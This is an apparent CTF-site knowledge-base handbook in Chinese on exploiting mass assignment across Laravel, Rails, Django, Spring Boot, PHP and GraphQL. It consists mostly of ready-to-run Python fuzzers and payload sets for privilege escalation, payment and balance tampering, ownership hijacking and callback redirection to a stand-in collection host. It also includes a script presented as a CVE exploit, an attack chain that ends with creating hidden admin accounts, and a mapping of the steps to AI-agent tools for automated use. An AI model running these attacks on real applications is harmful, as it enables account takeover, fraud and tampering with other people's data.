---
id: "ctf-website/15-mass-assignment/01-mass-assignment"
title: "批量赋值与属性注入深度利用手册"
title_en: "Mass Assignment & Attribute Injection Deep Exploitation Handbook"
summary: >
  覆盖 Laravel（$fillable/$guarded 绕过）、Rails（strong_parameters 绕过）、Django（ModelForm/Serializer）、
  Spring Boot（@ModelAttribute 绑定）、PHP 函数级漏洞（extract/parse_str/$$）和 GraphQL Mutation 字段注入的完整利用链。
summary_en: >
  Complete exploitation chains for mass assignment across frameworks: Laravel ($fillable/$guarded bypass),
  Rails (strong_parameters bypass), Django (ModelForm/Serializer), Spring Boot (@ModelAttribute binding),
  PHP function-level (extract/parse_str/$$), and GraphQL mutation field injection.
board: "ctf-website"
category: "15-mass-assignment"
signals: ["mass assignment", "批量赋值", "属性注入", "$fillable", "strong_parameters", "extract", "parse_str", "Serializer", "CWE-915"]
mcp_tools: ["http_probe", "kb_router", "kb_read_file", "run_ctf_tool"]
keywords: ["mass assignment", "批量赋值", "属性注入", "Laravel绑定", "Rails参数绑定", "extract绕过", "GraphQL注入", "CWE-915"]
difficulty: "advanced"
tags: ["mass-assignment", "framework", "laravel", "rails", "django", "spring-boot", "graphql", "web"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/15-mass-assignment/02-parameter-tampering", "ctf-website/12-payment/payment-bypass", "ctf-website/17-api-attacks/01-api-discovery-leak", "ctf-website/14-idor/02-bac-business-logic", "ctf-website/12-payment/payment-logic", "ctf-website/24-database/02-sqli-advanced"]
---
# 批量赋值与属性注入深度利用手册

## 场景

Mass Assignment（批量赋值/属性注入）发生于后端框架自动将请求参数绑定到模型属性时，未显式定义 allowlist（白名单）或 blocklist（黑名单），导致攻击者可以覆盖模型上不应由用户控制的属性。Laravel `$fillable`、Rails `strong_parameters`、Spring Boot `@ModelAttribute`、Django `ModelForm` 等均有不同形式的 mass assignment 对抗，但每个框架都有自己的绕过方式。

## 输入信号

- API 端点的请求体包含大量字段（JSON 对象），响应也返回相似结构
- 响应中包含 `role`、`is_admin`、`balance`、`status` 等权限敏感的字段
- 框架标识暴露：`X-Powered-By: Laravel`、`X-Runtime: Ruby on Rails`、`Server: Werkzeug` 等
- 字段命名风格暗示 ORM 绑定（`user[name]`、`order[status]`、`profile[is_verified]`）
- PATCH 方法用于部分更新（最常出现 mass assignment 的方法）
- GraphQL mutation 的 input 类型字段列表
- 使用 `_method`、`_token` 等框架辅助字段

## 核心方法论

### 0. 字段发现与绑定 Oracle

Mass Assignment 的关键是确认“字段被接收、被持久化、被业务使用”三个阶段。只看创建接口 `200` 不够，要立刻回读资源或触发下一步业务。

| 阶段 | 判断动作 | 命中信号 |
|---|---|---|
| 接收 | POST/PATCH 带额外字段 | 错误从 `unknown field` 变成业务校验错误 |
| 持久化 | GET `/me` / `/resource/{id}` | 响应出现注入字段 |
| 业务使用 | 访问高权限功能/跳过流程 | 权限、状态、余额、订阅变化 |
| 关系绑定 | 注入 nested/pivot/foreign key | 关联资源变化 |
| 类型转换 | 字符串/数组/对象变体 | parser 接受非预期类型 |

字段候选来源：

```text
响应 JSON 字段
Swagger/OpenAPI schema
GraphQL input type
Rails/Django/Laravel 报错
前端 form hidden/input name
移动端/JS bundle model 字段
数据库 dump / migration / seed
```

字段扩散器：

```python
def expand_sensitive_fields(base_fields):
    stems = set(base_fields)
    for stem in list(stems):
        stems.update({
            stem,
            stem.lower(),
            stem.upper(),
            stem.replace("_", ""),
            stem.replace("_", "-"),
        })
    extras = [
        "is_admin", "admin", "isAdmin", "role", "roles", "permissions",
        "is_staff", "is_superuser", "verified", "is_verified",
        "email_verified_at", "status", "state", "balance", "credits",
        "plan", "tier", "subscription", "owner_id", "user_id", "tenant_id",
        "organization_id", "team_id", "price", "amount", "discount",
    ]
    return sorted(stems | set(extras))
```

#### 0.1 字段到业务能力矩阵

字段注入的目标不是“让服务端接受一个字段”，而是让字段进入数据库并驱动业务分支。SQL 和支付要作为首要观察面：字段能否落库、是否影响订单金额、支付状态、折扣、退款、租户归属和导出范围。

| 字段族 | 典型字段 | 成功 oracle | 下一跳 |
|---|---|---|---|
| 角色/身份 | `role`, `is_admin`, `is_staff`, `permissions[]` | 菜单/端点/响应字段扩大 | BAC 角色矩阵 |
| 支付状态 | `status`, `state`, `paid`, `paid_at`, `payment_status` | 订单从 pending 变 paid | 支付状态机 |
| 金额/折扣 | `price`, `amount`, `total`, `discount`, `currency` | 总价、余额、优惠结果变化 | 支付绕过、精度/负数 |
| 余额/积分 | `balance`, `credits`, `points`, `wallet` | 账户余额或扣款逻辑变化 | 支付与数据库回读 |
| 归属关系 | `owner_id`, `user_id`, `tenant_id`, `account_id` | 对象挂到其他主体或租户 | IDOR/跨租户 |
| 回调/签名 | `webhook_secret`, `sign_key`, `callback_url` | 回调目标或签名校验变化 | Webhook/SSRF/支付回调 |
| 数据库控制 | `sort`, `filter`, `where`, `ids`, `deleted_at` | SQL 报错、软删除、批量影响 | SQLi/批量更新 |

字段路由器：

```python
# mass_assignment_field_router.py
import csv
import json
import re
import requests

FIELD_GROUPS = {
    "role": ["role", "roles", "is_admin", "is_staff", "is_superuser", "permissions"],
    "payment_state": ["status", "state", "paid", "paid_at", "payment_status", "refund_status"],
    "money": ["price", "amount", "total", "discount", "currency", "balance", "credits", "points"],
    "ownership": ["owner_id", "user_id", "tenant_id", "account_id", "org_id", "team_id"],
    "callback": ["webhook_secret", "sign_key", "callback_url", "return_url", "notify_url"],
    "database": ["sort", "filter", "where", "ids", "deleted_at", "version", "lock_version"],
}

def marker(resp):
    text = resp.text.lower()
    if any(x in text for x in ("paid_at", "payment_status", "transaction_id", "refund_id")):
        return "payment-oracle"
    if any(x in text for x in ("sql", "syntax", "constraint", "duplicate", "unknown column")):
        return "database-oracle"
    if any(x in text for x in ("admin", "permission", "staff", "superuser")):
        return "role-oracle"
    if resp.status_code in (200, 201, 202):
        return "accepted"
    return "rejected-or-business-error"

def candidate_payloads(base_payload):
    for group, fields in FIELD_GROUPS.items():
        for field in fields:
            values = [True, "true", "admin", 1, "2099-01-01T00:00:00Z"]
            if group == "money":
                values = [-1, 0, "0.00", "0e12345", 999999]
            if group == "ownership":
                values = [1, 2, "1", "00000000-0000-1000-8000-000000000001"]
            if group == "callback":
                values = ["https://callback.example/collect", "http://127.0.0.1:80/"]
            for value in values:
                payload = dict(base_payload)
                payload[field] = value
                yield group, field, value, payload

def run_field_matrix(base_url, endpoint, session, base_payload, readback_path=None):
    rows = []
    for group, field, value, payload in candidate_payloads(base_payload):
        r = session.post(base_url.rstrip("/") + endpoint, json=payload, timeout=10)
        readback = None
        if readback_path and r.status_code in (200, 201, 202):
            readback = session.get(base_url.rstrip("/") + readback_path, timeout=10)
        rows.append({
            "group": group,
            "field": field,
            "value": value,
            "status": r.status_code,
            "oracle": marker(r),
            "persisted_hint": marker(readback) if readback else "",
            "body": r.text[:260].replace("\n", " "),
        })
    with open("exports/field_accept_matrix.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
    return rows

def diff_json(before, after):
    b = json.loads(before)
    a = json.loads(after)
    return {k: [b.get(k), a.get(k)] for k in sorted(set(b) | set(a)) if b.get(k) != a.get(k)}
```

执行节奏：

1. 从 API discovery、响应 JSON、GraphQL schema、SQL 报错和前端表单抽字段。
2. 先跑字段矩阵，按 `role/payment_state/money/ownership/callback/database` 分组输出。
3. 每个 `accepted` 字段必须回读资源，生成 `persisted_field_diff.jsonl`。
4. 命中支付字段时回读订单、账单、发票、钱包余额，生成 `business_oracle_diff.json`。
5. 命中数据库字段时观察报错、软删除、排序、批量影响行数，跳 SQL 文档继续放大。

成功样本：回读时字段值与注入值一致，或下一步权限 oracle 发生变化。失败样本：`unknown attribute` 能泄露模型名和字段名；`unpermitted parameter` 能反推 Rails permit list。

### 1. 框架专项绕过

#### 1.1 Laravel — $fillable / $guarded 绕过

Laravel 的 mass assignment 保护基于 `$fillable` 和 `$guarded`。即使正确配置，仍然有绕过路径：

```python
# laravel_mass_assignment.py — Laravel 批量赋值绕过

LARAVEL_MASS_ASSIGN_PAYLOADS = {
    # === 基础: 直接传受保护字段 ===
    "is_admin_true": {"is_admin": True},
    "role_admin": {"role": "admin"},
    "permissions_all": {"permissions": ["*"]},

    # === 嵌套绑定: 如果模型没有 guarded 嵌套属性 ===
    "nested_role": {"user": {"role": "admin"}},       # $request->user()
    "nested_perms": {"profile": {"permissions": ["*"]}},

    # === 使用数组/对象绕过 ===
    "array_is_admin": {"is_admin": [True]},             # PHP type juggling
    "string_true": {"is_admin": "true"},

    # === 时间戳属性 ===
    "email_verified_now": {"email_verified_at": "2024-01-01T00:00:00Z"},
    "paid_at_now": {"paid_at": "2024-01-01T00:00:00Z"},

    # === belongsToMany 关联赋值 ===
    # 如果用户属性和角色是多对多:
    "roles_sync": {"roles": [1, 2, 3]},                  # 直接关联角色 ID
    "roles_attach": {"roles": [{"id": 1, "pivot": {"admin": True}}]},

    # === 日期/时间属性 (Carbon 自动转换) ===
    "trial_ends_2099": {"trial_ends_at": "2099-12-31"},
    "subscription_until": {"subscription_until": "2099-12-31T23:59:59Z"},
}

def laravel_mass_assign_test(base_url, session, known_fields: list):
    """测试 Laravel mass assignment"""
    base_payload = {"name": "test", "email": "test@test.com"}
    sensitive_fields = known_fields + [
        "is_admin", "role", "permissions", "is_staff", "user_level",
        "balance", "credits", "trial_ends_at", "email_verified_at",
        "paid_at", "subscription_ends_at", "stripe_id", "card_brand",
    ]

    results = {}
    for field in sensitive_fields:
        payload = {**base_payload, field: True if "is_" in field else "admin"}
        r = session.post(f"{base_url}/api/user/register", json=payload, timeout=10)
        results[field] = r.status_code

    # 检查响应中是否包含我们注入的敏感字段
    for field, status in results.items():
        if status == 200:
            print(f"[!] Possible mass assign: {field} accepted (200)")
```

#### 1.2 Ruby on Rails — Strong Parameters 绕过

```python
# rails_mass_assignment.py — Rails strong_parameters 绕过

RAILS_PAYLOADS = [
    # === 基础: 嵌套属性 ===
    {"user": {"name": "test", "admin": True}},
    {"user": {"name": "test", "role": "superadmin"}},

    # === accepts_nested_attributes_for 绕过 ===
    # 如果 Post has_many Comments:
    {"post": {"title": "x", "comments_attributes": {"0": {"body": "first", "admin_only": True}}},

    # === 使用数组索引 ===
    {"user": {"roles_attributes": {"0": {"name": "admin"}}}},

    # === 类型混淆 (Permit 列表包含 symbol 但传 string) ===
    {"user": {"role_ids": ["1", "2"]}},

    # === 关联对象的 mass assignment ===
    # 如果 User has_one Profile:
    {"user": {"profile_attributes": {"is_verified": True, "bio": "hacked"}}},

    # === 时间戳覆盖 ===
    {"user": {"confirmed_at": "2024-01-01", "confirmation_sent_at": "2024-01-01"}},

    # === 计数缓存覆盖 ===
    {"post": {"comments_count": 9999, "likes_count": 9999}},

    # === 密码绕过 ===
    # 如果 permit list 包含 :password_digest 但 name 不同:
    {"user": {"password": "newpass", "password_confirmation": "newpass"}},
]

# Rails 特有: permit list 分析
def analyze_rails_permit_list(error_response: str):
    """从错误响应中提取 Rails 的 permit list"""
    import re
    # Unpermitted parameter: :is_admin
    patterns = [
        r"Unpermitted parameter: :(\w+)",
        r"found unpermitted parameter: (\w+)",
        r"unknown attribute '(\w+)'",
    ]
    found = []
    for p in patterns:
        found.extend(re.findall(p, error_response))
    return found
```

#### 1.3 Django — ModelForm / Serializer 绕过

```python
# django_mass_assignment.py — Django mass assignment 绕过

DJANGO_MASS_ASSIGN_PAYLOADS = {
    # === DRF Serializer 自动绑定 ===
    # 如果 Serializer 使用了 fields = '__all__' 或未显式 exclude
    "is_staff": {"is_staff": True},
    "is_superuser": {"is_superuser": True},
    "user_permissions": {"user_permissions": [1, 2, 3]},
    "groups": {"groups": ["admin_group"]},

    # === Django ModelForm 自动绑定 ===
    "status_set": {"status": "active"},

    # === 通过 create() 方法 ===
    # 如果 Model.objects.create(**validated_data) 中 validated_data
    # 包含 serializer.validated_data 但未手动移除:

    # === 嵌套关系 ===
    # 使用 WritableNestedSerializer:
    "nested_perms": {
        "profile": {
            "is_verified": True,
            "role": "admin"
        }
    },

    # === GenericForeignKey 覆盖 ===
    "content_type_id": 1,      # 修改 content type
    "object_id": 999,

    # === 通过 JSONField 注入 ===
    # 如果字段是 JSONField, 可在 JSON 内设置任意属性:
    "metadata": {"is_admin": True, "vip_level": 99},
}

def django_test_extra_fields(base_url, session, endpoint="/api/users/"):
    """检测 Django REST Framework 额外字段"""
    base = {"username": "test_user", "password": "test1234"}
    extras = ["is_staff", "is_superuser", "groups", "user_permissions",
              "role", "is_active", "date_joined"]

    for field in extras:
        payload = {**base, field: True}
        r = session.post(f"{base_url}{endpoint}", json=payload, timeout=10)
        print(f"  {field:25s} → {r.status_code}")
        if r.status_code == 201:
            print(f"    [CREATED] Response: {r.text[:200]}")
```

#### 1.4 Spring Boot — @ModelAttribute 绑定

```python
# spring_mass_assignment.py — Spring Boot 绑定绕过

SPRING_MASS_ASSIGN_PAYLOADS = [
    # === 基础字段 ===
    {"role": "ROLE_ADMIN"},
    {"admin": True},
    {"enabled": True},
    {"accountNonLocked": True},
    {"credentialsNonExpired": True},
    {"accountNonExpired": True},

    # === 嵌套属性 (Spring Data binding) ===
    {"user.role": "ROLE_ADMIN"},
    {"user.admin": True},
    {"user.authorities[0].authority": "ROLE_ADMIN"},

    # === 集合注入 ===
    {"authorities": ["ROLE_ADMIN"]},
    {"permissions": ["WRITE_PRIVILEGES"]},

    # === Spring 角色组件特定 ===
    {"isAdmin": True},
    {"isEnabled": True},

    # === 通过 @RequestBody 注入 ===
    # 如果 controller 同时接受 @ModelAttribute 和 @RequestBody:
    {
        "username": "test",
        "role": "ROLE_ADMIN",
        "__admin__": True,
    },
]

def spring_actuator_mass_assign_check(base_url, session):
    """通过 Actuator 配置属性注入"""
    # 如果 /actuator/env 可写:
    r = session.post(f"{base_url}/actuator/env", json={
        "name": "spring.security.user.role",
        "value": "ROLE_ADMIN"
    })
    return r.status_code, r.text[:200]
```

### 2. PHP 函数级漏洞

PHP 项目中的 `extract()`、`parse_str()`、`$$` 变量变量是 mass assignment 的重灾区：

```python
# php_mass_assign.py — PHP 函数级 mass assignment

PHP_FUNCTION_VULNS = {
    # === extract() — 将数组键提取为变量 ===
    # extract($_POST) → 所有 POST 参数成为变量
    # 攻击: POST 带 is_admin=1 → $is_admin = 1
    "extract_example": """
    请求 POST: is_admin=1&role=admin&balance=999999
    extract($_POST);
    // 现在 $is_admin = 1, $role = 'admin', $balance = 999999
    """,

    # === parse_str() — 同 extract 但不创建全局变量 ===
    "parse_str_example": """
    parse_str($_SERVER['QUERY_STRING']);
    // $is_admin 被设置为查询参数值
    """,

    # === $$ (variable variables) — 动态变量名 ===
    "variable_vars": """
    foreach ($_POST as $key => $value) {
        $$key = $value;  // $is_admin = 1
    }
    """,

    # === compact() + extract() 组合 ===
    "compact_extract": """
    $fields = ['name', 'email', 'is_admin'];
    $data = compact($fields);
    // 如果 $is_admin 已被请求参数污染...
    """,
}

# PHP $$ 变量变量利用
PHP_VARIABLE_VULN_PAYLOADS = {
    "is_admin": 1,
    "role": "admin",
    "user_level": 9999,
    "authenticated": True,
    "bypass_check": True,
    "can_upload": True,
    "is_editor": True,
}
```

### 3. GraphQL Mutation 字段注入

GraphQL mutation 的 input 类型天然容易 mass assignment，因为 schema 定义了所有可写字段：

```python
# graphql_mutation_inject.py — GraphQL Mutation 字段注入检测

GRAPHQL_MASS_ASSIGN_QUERIES = [
    # === 用户注册 mutation 注入 ===
    """mutation {
        register(input: {
            email: "test@test.com",
            password: "test1234",
            role: ADMIN,           # ← 尝试覆盖角色
            isAdmin: true,
            points: 999999,
            referralCode: null
        }) {
            user { id email role points }
        }
    }""",

    # === 更新用户 profile ===
    """mutation {
        updateUser(input: {
            id: "MY_ID",
            name: "new name",
            role: MODERATOR,
            isVerified: true,
            subscriptionTier: PREMIUM
        }) {
            user { id role isVerified subscriptionTier }
        }
    }""",

    # === 创建资源时注入 ===
    """mutation {
        createPost(input: {
            title: "test",
            content: "test",
            status: PUBLISHED,        # ← 可能是管理员才有的权限
            isFeatured: true,
            visibility: PUBLIC,
            authorId: "OTHER_USER"    # ← 伪装他人
        }) {
            post { id status isFeatured }
        }
    }""",

    # === 嵌套输入 ===
    """mutation {
        checkout(input: {
            items: [{productId: "1", qty: 1}],
            shipping: {address: "x", method: "free"},
            payment: {
                method: FREE,          # ← 免费支付通道
                amount: 0,
                couponCode: "UNLIMITED_DISCOUNT"
            }
        }) {
            order { id total status }
        }
    }""",
]

def graphql_mass_assign_scan(base_url, session, queries: list):
    """批量测试 GraphQL mass assignment"""
    results = {}
    for i, query in enumerate(queries):
        r = session.post(f"{base_url}/graphql",
                         json={"query": query}, timeout=10)
        data = r.json() if r.status_code == 200 else {}
        results[f"q_{i}"] = {
            "status": r.status_code,
            "has_errors": "errors" in data,
            "data": data.get("data", {}),
            "sensitive_set": any(
                kw in str(data) for kw in ["ADMIN", "PREMIUM", "FREE", "999999"]
            )
        }

        if results[f"q_{i}"]["sensitive_set"]:
            print(f"[!] Possible mass assignment in query {i}")
            print(f"    Response: {json.dumps(data, indent=2)[:500]}")
    return results
```

### 4. 嵌套属性注入 (Nested Attributes)

框架支持嵌套关系自动创建/更新时，mass assignment 风险成倍增加：

```python
# nested_attribute_injection.py — 嵌套属性注入

NESTED_INJECTION_PAYLOADS = {
    # === 创建关联记录 ===
    "create_related": {
        "name": "test",
        "profile_attributes": {       # Rails / Laravel nested
            "is_verified": True,
            "role": "admin"
        }
    },

    # === 多对多关联注入 ===
    "has_many_inject": {
        "title": "test",
        "comments_attributes": [
            {"body": "auto comment", "author_id": "VICTIM_ID"}
        ]
    },

    # === 销毁关联 ===
    "destroy_related": {
        "profile_attributes": {
            "_destroy": True,        # Rails: 标记删除关联对象
            "id": 1
        }
    },

    # === 关联对象权限提升 ===
    "permissions_through_role": {
        "name": "test",
        "roles_attributes": [
            {"name": "admin", "permissions_attributes": [
                {"name": "*"}
            ]}
        ]
    },

    # === Laravel pivot 字段注入 ===
    "pivot_injection": {
        "roles": [{
            "id": 1,
            "pivot": {"admin": True, "expires_at": "2099-12-31"}
        }]
    },

    # === Django GenericForeignKey ===
    "generic_foreign_key": {
        "content_type": "auth.user",
        "object_id": 1,
        "permission": "admin"
    },
}
```

### 5. 真实 CVE 分析

| CVE | 产品 | 框架 | 原理 |
|-----|------|------|------|
| CVE-2025-3889 | WordPress Simple Shopping Cart | PHP | `extract($_POST)` 导致 `$wpdb` 变量被覆盖，未认证 SQL 注入 |
| CVE-2025-32361 | Vaultwarden | Rust | `POST /admin` 端点接受未过滤的组织管理字段，允许攻击者提升管理员角色 |
| CVE-2026-32513 | NodeBB | Node.js | 用户创建 API 通过 `userData` 参数接受任意字段，包括 `isAdmin` |
| CVE-2024-55555 | Laravel Nova | Laravel | 自定义资源字段未过滤，通过关联注入覆盖 `team_id` |
| CVE-2024-32709 | Discourse | Rails | `custom_fields` 参数未做 permit 过滤，可写入任意用户元数据 |

```python
# wordpress_extract_exploit.py — CVE-2025-3889 利用

def wordpress_extract_exploit(target_url):
    """
    WordPress Simple Shopping Cart CVE-2025-3889
    利用 extract($_POST) 覆盖 $wpdb → SQL 注入
    """
    # 步骤 1: 劫持 $wpdb 变量
    payload = {
        "wpdb": "SELECT 1,2,3 FROM wp_users WHERE user_login='admin'-- -",
        "ac": "add_cart",
        "item_number": "1",
    }

    r = requests.post(target_url, data=payload)
    print(f"Extract exploit: {r.status_code}")
    print(f"Response: {r.text[:500]}")

    # 步骤 2: 如果 extract 成功，$wpdb 被覆盖为 SQL 注入 payload
    # 后续任何使用 $wpdb 的查询都会执行攻击者控制的 SQL
```

## 攻击链

```
Phase 1 — 框架指纹识别 + 字段发现
  ├── 识别后端框架 (Laravel/Rails/Django/Spring/PHP)
  ├── 注册/创建请求 → 观察响应返回的额外字段
  ├── 错误信息可能泄露字段名 (Unpermitted parameter: xxx)
  └── 分析 API 文档 (Swagger/GraphQL schema) 中的可写字段

Phase 2 — 敏感字段注入
  ├── role/is_admin 类权限字段
  ├── status/verified_at 类状态字段
  ├── balance/credits 类金融字段
  └── 关联属性嵌套注入

Phase 3 — 垂直越权
  ├── 角色提升: user → admin → superadmin
  ├── 状态绕过: 跳过邮箱验证/跳过支付
  └── 资源越权: 创建/修改不属于自己的资源

Phase 4 — 全量利用
  ├── 批量提升所有用户权限
  ├── 创建管理员隐藏账户
  └── 修改系统配置
```

## 绑定路径变体矩阵

| 形态 | 示例 | 常见栈 |
|---|---|---|
| 平铺字段 | `{"role":"admin"}` | JSON API/DRF/Spring |
| 嵌套对象 | `{"user":{"role":"admin"}}` | Rails/Laravel/Express |
| 方括号 | `user[role]=admin` | PHP/Rails qs parser |
| 点号路径 | `user.role=admin` | Spring/Mongoose/lodash |
| 数组索引 | `roles[0][name]=admin` | Rails/Laravel |
| GraphQL input | `input:{role:ADMIN}` | GraphQL |
| JSONField | `metadata:{"role":"admin"}` | Django/Rails/Node |
| Pivot | `roles:[{"id":1,"pivot":{"admin":true}}]` | Laravel |

同一个字段至少测三种编码：JSON、form-urlencoded、multipart。很多网关只在 JSON 层拦字段，框架在 form 层仍会绑定。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测额外字段 | `http_probe` | 发送含敏感字段的 POST 请求，观察是否被接受 |
| 按信号查知识库 | `kb_router` | 搜索 mass assignment/attribute injection 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 运行扫描工具 | `run_ctf_tool` | 运行自定义参数 fuzzing 脚本 |

## 参考资料

- [CVE-2025-3889] WordPress Simple Shopping Cart — extract() Variable Overwrite
- [CWE-915] Improperly Controlled Modification of Dynamically-Determined Object Attributes
- [CWE-913] Improper Control of Dynamically-Managed Code Resources
- Laravel Documentation: Mass Assignment / Eloquent ORM
- Rails Guides: Strong Parameters
- Django REST Framework: Serializers

## Evidence

- 保存创建/更新请求、注入字段、字段编码形态、响应状态和错误信息。
- 记录回读接口、持久化字段、权限 oracle、业务状态变化和关联对象变化。
- 对失败样本记录 `unknown attribute`、`unpermitted parameter`、schema validation error 等字段泄露。
- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
